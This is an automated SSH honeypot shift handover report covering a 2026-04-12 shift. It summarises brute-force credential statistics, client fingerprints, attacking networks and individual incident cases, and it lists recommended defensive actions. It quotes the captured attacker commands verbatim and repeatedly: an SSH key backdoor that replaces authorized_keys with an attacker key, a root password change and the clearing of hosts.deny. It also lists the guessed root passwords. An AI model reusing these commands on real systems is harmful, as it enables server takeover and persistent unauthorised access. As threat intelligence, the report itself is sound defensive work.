# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T20:34:05Z |
| **Shift Time** | 20:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **151** |
| Confirmed Threats | **149** |
| False Positives Filtered | **2** (1.3%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **6** |
| High Severity Cases | **48** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **103** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **101** |
| Unique Credential Pairs | **55** |
| Unique Usernames | **25** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `345gs5662d34` | 24 |
| `ubuntu` | 4 |
| `postgres` | 3 |
| `deploy` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 23 |
| `123456` | 3 |
| `Qwerty#$` | 2 |
| `Admin#` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 23 |
| `root` | `Qwerty#$` | 2 |
| `admin` | `Admin#` | 1 |
| `steam` | `redis` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Server123!@#` | `112.151.178.49` | 2026-04-12T18:53:18 |
| `root` | `3245gs5662d34` | `112.151.178.49` | 2026-04-12T18:53:22 |
| `root` | `ZAQ!2wsx4321@#` | `112.151.178.49` | 2026-04-12T18:55:36 |
| `root` | `Qazwsx1234` | `112.151.178.49` | 2026-04-12T18:59:59 |
| `root` | `ubuntu20svm` | `112.151.178.49` | 2026-04-12T19:02:12 |
| `root` | `ccAA000` | `112.151.178.49` | 2026-04-12T19:06:41 |
| `root` | `Welcome1234` | `112.151.178.49` | 2026-04-12T19:13:38 |
| `root` | `Qwerty#$` | `171.25.158.57` | 2026-04-12T19:44:12 |
| `root` | `3245gs5662d34` | `171.25.158.57` | 2026-04-12T19:44:16 |
| `root` | `123456Kk` | `152.32.130.144` | 2026-04-12T19:47:10 |
| `root` | `3245gs5662d34` | `152.32.130.144` | 2026-04-12T19:47:14 |
| `root` | `Server2025` | `118.26.36.248` | 2026-04-12T19:56:04 |
| `root` | `3245gs5662d34` | `118.26.36.248` | 2026-04-12T19:56:07 |
| `root` | `QWEQWE123` | `118.26.36.248` | 2026-04-12T19:59:14 |
| `root` | `ciaociao` | `118.26.36.248` | 2026-04-12T20:00:49 |
| `root` | `Qwertyu12` | `118.26.36.248` | 2026-04-12T20:04:10 |
| `root` | `Abcd!1234` | `118.26.36.248` | 2026-04-12T20:05:51 |
| `root` | `qweQWE123` | `14.103.115.124` | 2026-04-12T20:10:12 |
| `root` | `abc123` | `178.217.169.240` | 2026-04-12T20:11:40 |
| `root` | `3245gs5662d34` | `178.217.169.240` | 2026-04-12T20:11:45 |
| `root` | `12345asd` | `118.26.36.248` | 2026-04-12T20:12:15 |
| `root` | `Woaini1314` | `118.26.36.248` | 2026-04-12T20:13:47 |
| `root` | `@Admin2026` | `118.26.36.248` | 2026-04-12T20:15:25 |
| `root` | `saeed` | `118.26.36.248` | 2026-04-12T20:17:04 |
| `root` | `QWERTYUI12345678` | `36.134.203.156` | 2026-04-12T20:17:56 |
| `root` | `jj123456.` | `118.26.36.248` | 2026-04-12T20:20:17 |
| `root` | `Qwerty#$` | `118.26.36.248` | 2026-04-12T20:21:56 |
| `root` | `Root999@123` | `118.26.36.248` | 2026-04-12T20:23:43 |
| `root` | `qwerty@1` | `118.26.36.248` | 2026-04-12T20:25:21 |
| `root` | `2wsx!@#` | `118.26.36.248` | 2026-04-12T20:28:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **151** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 123 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 122 | 9 |
| `f555226df196...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 122 | 9 | Modern SSH client |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:q8KwXuNvoff6"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.115.124`, `36.134.203.156`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.151.178.49`, `118.26.36.248`, `178.217.169.240`, `152.32.130.144`, `171.25.158.57`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **11** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS197119` | KRENA - Kyrgyz research and education network association | 1 | HIGH |
| `AS35100` | Patrik Lagerman | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (48)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b0f5f6ffdf56

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:53 |
| **Last Seen** | 2026-04-12 18:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:53:17` | `cowrie.session.connect` |
| `2026-04-12 18:53:17` | `cowrie.client.version` |
| `2026-04-12 18:53:18` | `cowrie.client.kex` |
| `2026-04-12 18:53:18` | `cowrie.login.success` |
| `2026-04-12 18:53:19` | `cowrie.session.params` |
| `2026-04-12 18:53:19` | `cowrie.command.input` |
| `2026-04-12 18:53:19` | `cowrie.command.failed` |
| `2026-04-12 18:53:19` | `cowrie.log.closed` |
| `2026-04-12 18:53:19` | `cowrie.session.params` |
| `2026-04-12 18:53:19` | `cowrie.command.input` |
| `2026-04-12 18:53:19` | `cowrie.session.file_download` |
| `2026-04-12 18:53:19` | `cowrie.log.closed` |
| `2026-04-12 18:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6820f075c5ee

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:53 |
| **Last Seen** | 2026-04-12 18:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:53:21` | `cowrie.session.connect` |
| `2026-04-12 18:53:21` | `cowrie.client.version` |
| `2026-04-12 18:53:21` | `cowrie.client.kex` |
| `2026-04-12 18:53:22` | `cowrie.login.success` |
| `2026-04-12 18:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cde42a1e633d

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:55 |
| **Last Seen** | 2026-04-12 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:55:35` | `cowrie.session.connect` |
| `2026-04-12 18:55:35` | `cowrie.client.version` |
| `2026-04-12 18:55:35` | `cowrie.client.kex` |
| `2026-04-12 18:55:36` | `cowrie.login.success` |
| `2026-04-12 18:55:36` | `cowrie.session.params` |
| `2026-04-12 18:55:36` | `cowrie.command.input` |
| `2026-04-12 18:55:36` | `cowrie.command.failed` |
| `2026-04-12 18:55:36` | `cowrie.log.closed` |
| `2026-04-12 18:55:36` | `cowrie.session.params` |
| `2026-04-12 18:55:36` | `cowrie.command.input` |
| `2026-04-12 18:55:37` | `cowrie.session.file_download` |
| `2026-04-12 18:55:37` | `cowrie.log.closed` |
| `2026-04-12 18:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a953e5603969

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:55 |
| **Last Seen** | 2026-04-12 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:55:39` | `cowrie.session.connect` |
| `2026-04-12 18:55:39` | `cowrie.client.version` |
| `2026-04-12 18:55:39` | `cowrie.client.kex` |
| `2026-04-12 18:55:39` | `cowrie.login.success` |
| `2026-04-12 18:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dc30f5a1664

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 18:59 |
| **Last Seen** | 2026-04-12 19:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 18:59:58` | `cowrie.session.connect` |
| `2026-04-12 18:59:58` | `cowrie.client.version` |
| `2026-04-12 18:59:58` | `cowrie.client.kex` |
| `2026-04-12 18:59:59` | `cowrie.login.success` |
| `2026-04-12 18:59:59` | `cowrie.session.params` |
| `2026-04-12 18:59:59` | `cowrie.command.input` |
| `2026-04-12 18:59:59` | `cowrie.command.failed` |
| `2026-04-12 18:59:59` | `cowrie.log.closed` |
| `2026-04-12 19:00:00` | `cowrie.session.params` |
| `2026-04-12 19:00:00` | `cowrie.command.input` |
| `2026-04-12 19:00:00` | `cowrie.session.file_download` |
| `2026-04-12 19:00:00` | `cowrie.log.closed` |
| `2026-04-12 19:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d22f02fd854

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:00 |
| **Last Seen** | 2026-04-12 19:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:00:02` | `cowrie.session.connect` |
| `2026-04-12 19:00:02` | `cowrie.client.version` |
| `2026-04-12 19:00:02` | `cowrie.client.kex` |
| `2026-04-12 19:00:03` | `cowrie.login.success` |
| `2026-04-12 19:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf0aadbbec23

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:02 |
| **Last Seen** | 2026-04-12 19:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:02:12` | `cowrie.session.connect` |
| `2026-04-12 19:02:12` | `cowrie.client.version` |
| `2026-04-12 19:02:12` | `cowrie.client.kex` |
| `2026-04-12 19:02:12` | `cowrie.login.success` |
| `2026-04-12 19:02:13` | `cowrie.session.params` |
| `2026-04-12 19:02:13` | `cowrie.command.input` |
| `2026-04-12 19:02:13` | `cowrie.command.failed` |
| `2026-04-12 19:02:13` | `cowrie.log.closed` |
| `2026-04-12 19:02:13` | `cowrie.session.params` |
| `2026-04-12 19:02:13` | `cowrie.command.input` |
| `2026-04-12 19:02:13` | `cowrie.session.file_download` |
| `2026-04-12 19:02:13` | `cowrie.log.closed` |
| `2026-04-12 19:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f867c86107d

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:02 |
| **Last Seen** | 2026-04-12 19:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:02:15` | `cowrie.session.connect` |
| `2026-04-12 19:02:15` | `cowrie.client.version` |
| `2026-04-12 19:02:15` | `cowrie.client.kex` |
| `2026-04-12 19:02:16` | `cowrie.login.success` |
| `2026-04-12 19:02:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb4cf99dac6

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:06 |
| **Last Seen** | 2026-04-12 19:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:06:41` | `cowrie.session.connect` |
| `2026-04-12 19:06:41` | `cowrie.client.version` |
| `2026-04-12 19:06:41` | `cowrie.client.kex` |
| `2026-04-12 19:06:41` | `cowrie.login.success` |
| `2026-04-12 19:06:42` | `cowrie.session.params` |
| `2026-04-12 19:06:42` | `cowrie.command.input` |
| `2026-04-12 19:06:42` | `cowrie.command.failed` |
| `2026-04-12 19:06:42` | `cowrie.log.closed` |
| `2026-04-12 19:06:42` | `cowrie.session.params` |
| `2026-04-12 19:06:42` | `cowrie.command.input` |
| `2026-04-12 19:06:42` | `cowrie.session.file_download` |
| `2026-04-12 19:06:42` | `cowrie.log.closed` |
| `2026-04-12 19:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d4ddb5f092a

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:06 |
| **Last Seen** | 2026-04-12 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:06:44` | `cowrie.session.connect` |
| `2026-04-12 19:06:44` | `cowrie.client.version` |
| `2026-04-12 19:06:45` | `cowrie.client.kex` |
| `2026-04-12 19:06:45` | `cowrie.login.success` |
| `2026-04-12 19:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53afba6d1e0e

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:13 |
| **Last Seen** | 2026-04-12 19:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:13:38` | `cowrie.session.connect` |
| `2026-04-12 19:13:38` | `cowrie.client.version` |
| `2026-04-12 19:13:38` | `cowrie.client.kex` |
| `2026-04-12 19:13:38` | `cowrie.login.success` |
| `2026-04-12 19:13:39` | `cowrie.session.params` |
| `2026-04-12 19:13:39` | `cowrie.command.input` |
| `2026-04-12 19:13:39` | `cowrie.command.failed` |
| `2026-04-12 19:13:39` | `cowrie.log.closed` |
| `2026-04-12 19:13:39` | `cowrie.session.params` |
| `2026-04-12 19:13:39` | `cowrie.command.input` |
| `2026-04-12 19:13:39` | `cowrie.session.file_download` |
| `2026-04-12 19:13:39` | `cowrie.log.closed` |
| `2026-04-12 19:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.151.178[.]49` to AbuseIPDB if not already reported
- [ ] Block `112.151.178[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c40aa89badd9

| Field | Detail |
|---|---|
| **Source IP** | `112.151.178[.]49` |
| **First Seen** | 2026-04-12 19:13 |
| **Last Seen** | 2026-04-12 19:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 19:13:41` | `cowrie.session.connect` |
| `2026-04-12 19:13:41` | `cowrie.client.version` |
| `2026-04-12 19:13:41` | `cowrie.client.kex` |
| `2026-04-12 19:13:42` | `cowrie.login.success` |
| `2026-04-12 19:13:42` | `cowrie.session.closed` |

